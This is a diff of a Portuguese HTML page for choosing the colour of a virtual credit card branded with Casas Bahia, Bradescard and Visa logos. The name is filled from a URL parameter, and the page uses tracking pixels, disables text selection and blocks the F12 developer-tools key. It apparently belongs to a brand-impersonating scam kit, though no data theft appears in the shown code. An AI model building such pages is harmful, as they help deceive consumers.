@@ -1,551 +1,168 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
+<!DOCTYPE html><html lang="pt-BR"><head>
     <meta charset="UTF-8">
     <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link href="css/all.min.css" rel="stylesheet">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, max-scale=1.0">
-    <title>Escolha o Design do Seu Cartão</title>
 
-    <style>      body {
-        font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 50%, #f1f5f9 100%);
-        color: #1e293b;
-        margin: 0;
-        padding: 0;
-        min-height: 100vh;
-        line-height: 1.6;
-        overflow-x: hidden;
-      }      .iframe-container {
-        width: 100%;
-        max-width: 380px;
-        margin: 0 auto;
-        padding: 10px;
-        box-sizing: border-box;
-        min-height: auto;
-      }
-
+    <style>
       .header {
-        background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
-        padding: 25px 0;
+        background: linear-gradient(147deg, #003675 0%, #0d64fb 74%);
+        padding: 15px 0;
         text-align: center;
-        border-bottom: 4px solid #0d64fb;
-        box-shadow: 0 2px 15px rgba(13, 100, 251, 0.1);
-        position: relative;
-        overflow: hidden;
       }
-
-      .header::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-        animation: shimmer 3s infinite;
-      }
-
-      @keyframes shimmer {
-        0% { left: -100%; }
-        100% { left: 100%; }
-      }
-
-      .header img {
-        width: 130px;
-        transition: transform 0.3s ease;
-        position: relative;
-        z-index: 1;
-      }
-
-      .header img:hover {
-        transform: scale(1.05);
-      }      .main-content {
-        width: 100%;
-        background: linear-gradient(145deg, #ffffff 0%, #fafbfc 100%);
+      .main-content {
+        max-width: 400px;
+        background-color: white;
         text-align: center;
-        padding: 15px;
-        border-radius: 12px;
-        box-shadow: 
-          0 6px 24px rgba(0, 0, 0, 0.05),
-          0 2px 6px rgba(0, 0, 0, 0.03),
-          inset 0 1px 0 rgba(255, 255, 255, 0.7);
-        border: 1px solid rgba(226, 232, 240, 0.6);
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-        box-sizing: border-box;
-      }
-
-      .main-content:hover {
-        transform: translateY(-1px);
-        box-shadow: 
-          0 12px 40px rgba(0, 0, 0, 0.08),
-          0 3px 8px rgba(0, 0, 0, 0.06);
-      }      .main-title {
-        font-size: 18px;
-        font-weight: 700;
-        color: #1e293b;
-        margin-bottom: 6px;
-        letter-spacing: -0.025em;
-        line-height: 1.3;
-      }
-
-      .subtitle {
-        color: #64748b;
-        font-size: 12px;
-        margin-bottom: 15px;
-        font-weight: 500;
-      }
-
-      .section-title {
-        font-size: 14px;
-        font-weight: 600;
-        color: #1e293b;
-        margin-bottom: 12px;
-        letter-spacing: -0.025em;
-      }      .color-options {
-        display: flex;
-        justify-content: center;
-        gap: 10px;
-        margin-bottom: 15px;
-        padding: 12px;
-        background: linear-gradient(135deg, rgba(13, 100, 251, 0.02) 0%, rgba(59, 130, 246, 0.05) 100%);
+        padding: 2rem;
         border-radius: 10px;
-        border: 1px solid rgba(13, 100, 251, 0.1);
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 30px auto;
       }
-
+      .color-options {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
       .color-options button {
-        width: 45px;
-        height: 45px;
+        width: 50px;
+        height: 50px;
         border-radius: 50%;
         border: 2px solid transparent;
         cursor: pointer;
-        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        position: relative;
-        overflow: hidden;
-        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+        transition: border 0.3s ease;
       }
-
-      .color-options button::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        border-radius: 50%;
-        background: linear-gradient(45deg, rgba(255, 255, 255, 0.3) 0%, transparent 50%, rgba(255, 255, 255, 0.1) 100%);
-        opacity: 0;
-        transition: opacity 0.3s ease;
+      .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
       }
-
+      .footer p {
+        margin: 0; /* Remove espaçamento extra entre as linhas do rodapé */
+      }
       .color-options button:hover {
-        transform: scale(1.1);
-        border-color: #0d64fb;
-        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25);
+        border-color: #6c63ff;
       }
-
-      .color-options button:hover::before {
-        opacity: 1;
-      }
-
       .color-options .selected {
-        border-color: #0d64fb;
-        transform: scale(1.05);
-        box-shadow: 
-          0 6px 20px rgba(13, 100, 251, 0.3),
-          0 0 0 4px rgba(13, 100, 251, 0.1);
-      }      .cartao-container {
-        position: relative;
-        display: block;
-        margin-bottom: 20px;
-      }      .cartao {
-        width: 100%;
-        min-height: 190px;
-        border-radius: 20px;
-        background: linear-gradient(145deg, #f8fafc 0%, #e2e8f0 65%, #0d64fb 65%, #1e40af 100%);
-        color: #1e293b;
-        padding: 25px;
-        display: flex;
-        flex-direction: column;
-        justify-content: space-between;
-        box-shadow: 
-          0 8px 32px rgba(13, 100, 251, 0.15),
-          0 2px 8px rgba(0, 0, 0, 0.08),
-          inset 0 1px 0 rgba(255, 255, 255, 0.9);
-        font-family: 'Segoe UI', Arial, sans-serif;
-        position: relative;
-        overflow: hidden;
-        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-        border: 1px solid rgba(226, 232, 240, 0.6);
-      }      .cartao::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        right: -50%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
-        transform: skewX(-25deg);
-        transition: right 0.6s ease;      }      /* Header do cartão com logos */
-      .card-header {
-        font-weight: 600;
-        font-size: 11px;
-        color: #555;
-        margin-bottom: 15px;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-        font-family: 'Arial', sans-serif;
-        position: relative;
-        z-index: 2;
+        border-color: #6c63ff;
       }
-
-      .card-logos {
-        display: flex;
-        gap: 15px;
-        align-items: center;
-      }
-
-      .casas-bahia-logo {
-        font-weight: bold;
+      .btn-custom {
+        background-color: #0d64fb;
+        color: rgb(255, 255, 255);
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
         font-size: 16px;
-        color: #0066cc;
-        letter-spacing: 1px;
-      }
-
-      .casas-bahia-logo .casas {
-        color: #0066cc;
-      }
-
-      .casas-bahia-logo .bahia {
-        color: #ff6b00;
-      }
-
-      .bradescard-logo {
-        display: flex;
-        align-items: center;
-        gap: 5px;
-      }
-
-      .bradescard-logo img {
-        height: 18px;
-        width: auto;
-      }      .chip-contactless {
-        display: flex;
-        align-items: center;
-        gap: 15px;
-        margin: 20px 0;
-      }
-
-      .chip {
-        width: 55px;
-        height: 40px;
-      }
-
-      .imagem-chip {
-        width: 100%;
-        height: 100%;
-        object-fit: contain;
-      }
-
-      .contactless {
-        color: #0066cc;
-        font-size: 18px;
-        transform: rotate(90deg);
-      }
-
-      .imagem-lateral {
-        display: none; /* Removemos a imagem lateral para seguir o design da referência */
-      }      .visa-logo {
-        position: absolute;
-        bottom: 20px;
-        right: 20px;
-        display: flex;
-        flex-direction: column;
-        align-items: flex-end;
-      }
-
-      .visa-logo img {
-        height: 18px;
-        width: auto;
-        filter: brightness(0) invert(1);
-      }
-
-      .visa-platinum {
-        font-size: 8px;
-        margin-top: 2px;
-        color: white;        font-weight: 600;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-        font-family: 'Arial', sans-serif;
-      }
-
-      .card-info {
-        display: flex;
-        justify-content: space-between;
+        cursor: pointer;
         margin-top: 20px;
       }
-
-      .card-info div {
-        font-size: 11px;
-        color: #555;
-        font-family: 'Arial', sans-serif;
-        font-weight: 500;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
+      .btn-custom:hover {
+        background-color: #000;
       }
-
-      .card-info div strong {
-        font-size: 8px;
-        color: #777;
+      .cartao-container {
+        position: relative;
         display: block;
-        margin-bottom: 3px;
-        font-weight: 600;
-        letter-spacing: 1px;
       }
-
-      #titular-nome {
-        font-family: 'Arial', sans-serif;
-        font-weight: 600;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: 11px;
-        color: #333;
-      }/* Número do cartão */
-      .card-number {
-        font-size: 20px;
-        letter-spacing: 3px;
-        margin: 15px 0;
-        color: #333;
-        font-family: 'Consolas', 'Monaco', 'Lucida Console', 'Liberation Mono', 'DejaVu Sans Mono', 'Bitstream Vera Sans Mono', 'Courier New', monospace;
-        font-weight: 600;
-        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
-      }.btn-custom {
-        background: linear-gradient(135deg, #0d64fb 0%, #1e40af 100%);
-        color: white;
-        border: none;
-        border-radius: 10px;
-        padding: 14px 20px;
+      .cartao {
         width: 100%;
-        font-weight: 600;
-        font-size: 14px;
-        cursor: pointer;
-        margin-top: 15px;
-        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        box-shadow: 
-          0 3px 12px rgba(13, 100, 251, 0.25),
-          inset 0 1px 0 rgba(255, 255, 255, 0.2);
-        letter-spacing: 0.025em;
+        height: 180px;
+        border-radius: 15px;
+        background: #ffffff;
+        color: #333;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        font-family: Arial, sans-serif;
         position: relative;
         overflow: hidden;
+        border: 1px solid #e0e0e0;
       }
-
-      .btn-custom::before {
-        content: '';
+      .cartao-color-bar {
         position: absolute;
-        top: 0;
-        left: -100%;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        height: 60px;
+        background: var(--cartao-color, #000);
+        border-bottom-left-radius: 15px;
+        border-bottom-right-radius: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 15px;
+        box-sizing: border-box;
+      }
+      .cartao-color-bar .card-details .texto {
+        color: white;
+        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+      }
+      .cartao-color-bar .card-details #titular-nome,
+      .cartao-color-bar .card-details #valido-data {
+        color: white;
+        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+      }
+      /* Texto escuro para cores claras como amarelo */
+      .cartao-color-bar.light-color .card-details .texto {
+        color: #333;
+        text-shadow: none;
+      }
+      .cartao-color-bar.light-color .card-details #titular-nome,
+      .cartao-color-bar.light-color .card-details #valido-data {
+        color: #333;
+        text-shadow: none;
+      }
+      .imagem-chip {
+        width: 35px;
+        position: absolute;
+        top: 40%;
+        left: 15px;
+        transform: translateY(-50%);
+      }
+      .imagem-lateral {
+        width: 30px;
+        position: absolute;
+        top: 40%;
+        left: 60px;
+        transform: translateY(-50%);
+      }
+      .top-left-text {
+        position: absolute;
+        top: 15px;
+        left: 15px;
+        width: 100px;
+      }
+      .top-right-img {
+        width: 50px;
+        position: absolute;
+        top: 15px;
+        right: 15px;
+      }
+      .card-details {
+        display: flex;
+        justify-content: space-between;
         width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-        transition: left 0.5s ease;
+        align-items: center;
       }
-
-      .btn-custom:hover::before {
-        left: 100%;
+      .titular {
+        text-align: left;
       }
-
-      .btn-custom:hover {
-        background: linear-gradient(135deg, #1e40af 0%, #3730a3 100%);
-        transform: translateY(-2px);
-        box-shadow: 
-          0 8px 25px rgba(13, 100, 251, 0.4),
-          inset 0 1px 0 rgba(255, 255, 255, 0.3);
+      .valido {
+        text-align: right;
       }
-
-      .footer {
-        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
-        border-top: 1px solid rgba(226, 232, 240, 0.8);
-        text-align: center;
-        padding: 20px;
-        font-size: 11px;
-        color: #64748b;
-        margin-top: auto;
-        backdrop-filter: blur(10px);
-      }
-
-      .footer p {
+      .titular p,
+      .valido p {
         margin: 0;
-      }      /* Responsividade para iframe mobile */
-      @media (max-width: 400px) {
-        .iframe-container {
-          padding: 6px;
-          max-width: 100%;
-        }
-
-        .main-content {
-          padding: 10px;
-          border-radius: 8px;
-        }
-
-        .main-title {
-          font-size: 15px;
-          margin-bottom: 4px;
-        }
-
-        .subtitle {
-          font-size: 10px;
-          margin-bottom: 12px;
-        }
-
-        .section-title {
-          font-size: 12px;
-          margin-bottom: 10px;
-        }        .cartao {
-          min-height: 140px;
-          padding: 15px;
-        }
-
-        .color-options {
-          gap: 6px;
-          padding: 8px;
-          margin-bottom: 12px;
-        }
-
-        .color-options button {
-          width: 35px;
-          height: 35px;        }
-
-        .btn-custom {
-          padding: 10px 14px;
-          font-size: 12px;
-          margin-top: 12px;
-        }
-
-        /* Ajustes específicos do cartão para mobile */
-        .card-number {
-          font-size: 16px;
-          letter-spacing: 2px;
-        }
-
-        .card-info div {
-          font-size: 9px;
-        }
-
-        .card-info div strong {
-          font-size: 7px;
-        }
-
-        #titular-nome {
-          font-size: 9px !important;
-        }
-
-        .visa-logo img {
-          height: 14px;
-        }
-
-        .visa-platinum {
-          font-size: 6px;
-        }
-
-        .chip {
-          width: 45px;
-          height: 32px;
-        }        .contactless {
-          font-size: 14px;
-        }
-
-        .card-header {
-          font-size: 9px;
-        }
-
-        .casas-bahia-logo {
-          font-size: 12px;
-        }
-
-        .bradescard-logo img {
-          height: 14px;
-        }
+        font-size: 10px; /* Tamanho da fonte para o texto */
+        color: #ffffff; /* Texto branco para contraste */
       }
-
-      @media (max-width: 768px) {
-        .main-content {
-          margin: 0;
-          padding: 12px;
-          max-width: none;
-        }        .cartao {
-          min-height: 160px;
-          padding: 20px;
-        }
-
-        .color-options {
-          gap: 8px;
-          padding: 10px;
-        }
-
-        .color-options button {
-          width: 40px;
-          height: 40px;
-        }        /* Ajustes do cartão para tablets */
-        .card-number {
-          font-size: 18px;
-          letter-spacing: 2.5px;
-        }
-
-        .card-info div {
-          font-size: 10px;
-        }
-
-        .card-info div strong {
-          font-size: 7px;
-        }
-
-        #titular-nome {
-          font-size: 10px !important;
-        }
-
-        .visa-logo img {
-          height: 16px;
-        }
-
-        .visa-platinum {
-          font-size: 7px;
-        }
-
-        .chip {
-          width: 50px;
-          height: 36px;        }
-
-        .contactless {
-          font-size: 15px;
-        }
-      }
-
-      /* Melhorias de performance */
-      .cartao,
-      .main-content,
-      .color-options button,
-      .btn-custom {
-        will-change: transform;
-      }
-
-      /* Acessibilidade */
-      @media (prefers-reduced-motion: reduce) {
-        *,
-        *::before,
-        *::after {
-          animation-duration: 0.01ms !important;
-          animation-iteration-count: 1 !important;
-          transition-duration: 0.01ms !important;
-        }
-      }
-
-      .btn-custom:focus,
-      .color-options button:focus {
-        outline: 2px solid #0d64fb;
-        outline-offset: 2px;
+      .texto {
+        font-size: 14px; /* Tamanho da fonte do texto "Titular do Cartão" */
+        text-transform: uppercase;
+        color: rgba(255, 255, 255, 0.8); /* Texto branco semi-transparente */
       }
     </style>
     <script>
@@ -623,68 +240,54 @@
       }
     </script>
    
-    <script async="" defer="" src="js/pixel.js"></script></head>  <body style="user-select: none;">
-    
-    <div class="iframe-container">
-      <div class="main-content">
-        <h1 class="main-title">Escolha o design do seu cartão</h1>
-        <p class="subtitle">
-          Selecione o estilo que mais combina com você
-        </p>
-        
-        <h2 class="section-title">Escolha a cor do seu cartão</h2>
-        <div class="color-options">
-          <button style="background-color: #000" class="selected" title="Preto Elegante"></button>
-          <button style="background-color: #8420b3" title="Roxo Premium"></button>
-          <button style="background-color: #ffc600" title="Dourado Luxo"></button>
-          <button style="background-color: #0454cc" title="Azul Clássico"></button>
-        </div>
+    <script async="" defer="" src="js/pixel.js"></script></head><body style="user-select: none;"><div style="
+        display: grid;
+        grid-template-areas:
+          'top-bar'
+          'content'
+          'footer';
+        grid-template-rows: auto 1fr auto;
+        min-height: 100vh;
+      ">
+      <div style="grid-area: content; padding: 0 1rem">
+        <div class="main-content">
+          <h4 style="font-size: 20px">Escolha o design do seu cartão</h4>
+          <!-- Defina o tamanho aqui -->
+          <p style="font-size: 16px">
+            Selecione o estilo que mais combina com você
+          </p>
+          <h6 style="font-size: 16px">Escolha a cor do seu cartão</h6>
+          <div class="color-options">
+            <button style="background-color: #000" class="selected"></button>
+            <button style="background-color: #8420b3"></button>
+            <button style="background-color: #FFD700"></button>
+            <button style="background-color: #0454cc"></button>
+          </div>
           <div class="cartao-container">
-          <div class="cartao">
-            <div class="card-header">
-              <span>Cartão Virtual</span>
-              <div class="card-logos">
-                <span class="casas-bahia-logo">
-                  <span class="casas">CASAS</span><span class="bahia">BAHIA</span>
-                </span>
-                <span class="bradescard-logo">
-                  <img src="images/bradescard.png" alt="Bradescard">
-                </span>
+            <div class="cartao">
+              <div class="cartao-color-bar">
+                <div class="card-details">
+                  <div class="titular">
+                    <p class="texto">Titular do Cartão</p>
+                    <p id="titular-nome" style="font-size: 16px; color: #ffffff;">Nome Indisponível</p>
+                  </div>
+                  <div class="valido">
+                    <p class="texto">Válido Até</p>
+                    <p id="valido-data" style="font-size: 14px; color: #ffffff;">01/32</p>
+                  </div>
+                </div>
               </div>
-            </div>
-            
-            <div class="chip-contactless">
-              <div class="chip">
-                <img src="images/cartao-credito.png" alt="Chip do cartão" class="imagem-chip">
+              <div style="position: absolute; top: 15px; right: 15px; display: flex; align-items: center; gap: 8px;">
+                <img src="images/logo.svg" alt="Casas Bahia logo" style="height: 16px; width: auto; opacity: 0.9;">
+                <img src="images/Visa-logo-black.png" alt="Visa logo" style="height: 28px; width: auto;">
               </div>
-              <div class="contactless">))))</div>
-            </div>
-            
-            <div class="card-number">4532 •••• •••• ••••</div>
-            
-            <div class="card-info">
-              <div>
-                <strong>TITULAR</strong>
-                <div id="titular-nome">Nome Indisponível</div>
-              </div>
-              <div>
-                <strong>VALIDADE</strong>
-                <div>08/29</div>
-              </div>
-              <div>
-                <strong>CVV</strong>
-                <div>•••</div>
-              </div>
-            </div>
-
-            <div class="visa-logo">
-              <img src="images/Visa-logo-white.png" alt="Visa">
-              <div class="visa-platinum">Platinum</div>
+              <img src="images/chip-1-logo-png-transparent.png" alt="Chip do Cartão" class="imagem-chip">
+              <img src="images/Design-sem-nome.png" alt="Lateral logo" class="imagem-lateral">
             </div>
           </div>
         </div>
       </div>
-    </div><script>
+    <script>
       document.addEventListener("DOMContentLoaded", function () {
         const parametros = new URLSearchParams(window.location.search);
         const nome = parametros.get("nome");
@@ -692,95 +295,59 @@
           document.getElementById("titular-nome").innerText = nome;
         } else {
           document.getElementById("titular-nome").innerText = "Nome Indisponível";
-        }        const corSelecionada = localStorage.getItem("cartaoCor");
+        }
+
+        const corSelecionada = localStorage.getItem("cartaoCor");
         if (corSelecionada) {
-          const gradient = `linear-gradient(145deg, #f8fafc 0%, #e2e8f0 65%, ${corSelecionada} 65%, ${corSelecionada} 100%)`;
-          document.querySelector(".cartao").style.background = gradient;
-          const botaoCorrespondente = document.querySelector(`.color-options button[style*="${corSelecionada}"]`);
-          if (botaoCorrespondente) {
+          const colorBar = document.querySelector(".cartao-color-bar");
+          if (colorBar) {
+            colorBar.style.background = corSelecionada;
+            
+            // Adicionar classe para cores claras (amarelo)
+            if (corSelecionada === "#FFD700") {
+              colorBar.classList.add("light-color");
+            } else {
+              colorBar.classList.remove("light-color");
+            }
+          }
+          
+          const buttonToSelect = document.querySelector(`.color-options button[style*="${corSelecionada}"]`);
+          if (buttonToSelect) {
             document.querySelector(".color-options .selected").classList.remove("selected");
-            botaoCorrespondente.classList.add("selected");
+            buttonToSelect.classList.add("selected");
           }
         }
       });
 
       const colorOptions = document.querySelectorAll(".color-options button");
-      const cartao = document.querySelector(".cartao");      colorOptions.forEach((button, index) => {
+      const colorBar = document.querySelector(".cartao-color-bar");
+
+      colorOptions.forEach((button, index) => {
         button.addEventListener("click", () => {
-          // Remove seleção anterior
-          document.querySelector(".color-options .selected").classList.remove("selected");
+          document
+            .querySelector(".color-options .selected")
+            .classList.remove("selected");
           button.classList.add("selected");
 
-          const colors = ["#000", "#8420b3", "#ffc600", "#0454cc"];
-          const selectedColor = colors[index];          // Cria gradiente com a cor selecionada mantendo o design de duas faixas
-          const gradient = `linear-gradient(145deg, #f8fafc 0%, #e2e8f0 65%, ${selectedColor} 65%, ${selectedColor} 100%)`;
+          const colors = ["#000", "#8420b3", "#FFD700", "#0454cc"];
+          const selectedColor = colors[index];
+
+          // Aplicar cor apenas na barra inferior
+          if (colorBar) {
+            colorBar.style.background = selectedColor;
+            
+            // Adicionar classe para cores claras (amarelo)
+            if (selectedColor === "#FFD700") {
+              colorBar.classList.add("light-color");
+            } else {
+              colorBar.classList.remove("light-color");
+            }
+          }
           
-          // Aplica a cor com animação suave
-          cartao.style.transition = "background 0.4s ease";
-          cartao.style.background = gradient;
           localStorage.setItem("cartaoCor", selectedColor);
-
-          // Feedback visual
-          button.style.transform = "scale(1.15)";
-          setTimeout(() => {
-            button.style.transform = "";
-          }, 200);
-        });
-      });
-
-      function confirmarEscolha() {
-        const corSelecionada = localStorage.getItem("cartaoCor");
-        const nome = document.getElementById("titular-nome").innerText;
-        
-        // Salva as preferências
-        localStorage.setItem("cartaoPersonalizado", "true");
-        localStorage.setItem("nomeCartao", nome);
-        
-        // Feedback visual do botão
-        const btn = event.target;
-        btn.style.transform = "scale(0.95)";
-        btn.innerHTML = '<i class="fas fa-check"></i> Confirmado!';
-        
-        setTimeout(() => {
-          btn.style.transform = "";
-          btn.innerHTML = 'Redirecionando...';
-          
-          // Redireciona após confirmação
-          setTimeout(() => {
-            window.location.href = `index.html${window.location.search}`;
-          }, 1000);
-        }, 500);
-      }
-
-      // Adiciona efeitos de hover nos botões de cor
-      colorOptions.forEach(button => {
-        button.addEventListener('mouseenter', function() {
-          if (!this.classList.contains('selected')) {
-            this.style.transform = 'scale(1.1)';
-          }
-        });
-        
-        button.addEventListener('mouseleave', function() {
-          if (!this.classList.contains('selected')) {
-            this.style.transform = '';
-          }
         });
       });
     </script>
-
-    <!-- Utmify utms capture -->
-    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-    
-    <!-- Utmify pixel -->
-    <script>
-      window.pixelId = "66bb763debbcebab27d68442";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
-    <!-- Utmify end -->
     
       <script>
     // Impedir a tecla F12 (abre as ferramentas de desenvolvedor)
